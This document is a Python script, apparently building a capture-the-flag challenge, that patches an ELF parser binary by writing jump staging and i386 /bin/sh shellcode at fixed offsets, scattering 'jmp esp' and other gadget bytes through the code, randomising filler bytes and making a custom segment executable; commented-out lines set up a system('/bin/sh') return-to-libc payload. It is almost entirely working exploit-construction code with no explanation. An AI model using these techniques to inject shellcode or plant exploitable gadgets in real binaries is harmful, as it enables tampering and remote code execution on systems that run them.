import sys, struct

import capstone

patch_base = 0x1000

from pwn import *

with open(sys.argv[1], 'rb') as fd:
    data = fd.read()

import topatch

badinst_1b = [5, 13, 21, 29, 37, 45, 53, 61, 104, 105, 107, 128, 129, 130, 131, 154, 160, 161, 162, 163, 169, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 198, 199, 200, 202, 232, 233, 234, 240]
badinst_2b = [asm("jmp $"), asm("jmp esp")]

staging = asm("jmp $+72")
offset = 0xcb88 + patch_base
nd = data[:offset] + staging+ data[offset+len(staging):]

staging = asm("jmp $+117")
offset = 0xcb88 + patch_base + 72
nd = nd[:offset] + staging+ nd[offset+len(staging):]

offset = 0xcb88 + patch_base + 72 + 117
shellcode = asm(pwnlib.shellcraft.i386.linux.sh())
nd = nd[:offset] + shellcode + nd[offset+len(shellcode):]

import random
offs = topatch.off
offs.sort()
for i in range(len(offs)):
    off = offs[i] + patch_base
    if offs[i]+1 in offs:
        nd = nd[:off] + bytes([random.choice(badinst_1b)]) + nd[off+1:]
    else:
        nd = nd[:off] + random.choice(badinst_2b) + nd[off+2:]
for i in range(0x10000):
    off = i + patch_base
    if int(nd[off]) == 0:
        nd = nd[:off] + bytes([random.choice(range(0x100))]) + nd[off+1:]


#addr = 0x080490db
#offset = 0x219
#nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]
#
#system_addr = 0x08048890
#binsh_addr = 0x0806c6b7
#offset = 0x323
#nd = nd[:offset] + struct.pack('<I', system_addr) + 'HHHH' + struct.pack('<I', binsh_addr) + nd[offset+12:]

with open('elfparser_1bug_patched', 'wb') as fd:
    fd.write(nd)

import lief
binary = lief.parse("elfparser_1bug_patched")
for seg in binary.segments:
    if len(seg.sections) == 1 and seg.sections[0].name == ".orz":
        seg.remove(lief.ELF.SEGMENT_FLAGS.W)
        seg.add(lief.ELF.SEGMENT_FLAGS.R)
        seg.add(lief.ELF.SEGMENT_FLAGS.X)
binary.write("elfparser_1bug_patched")
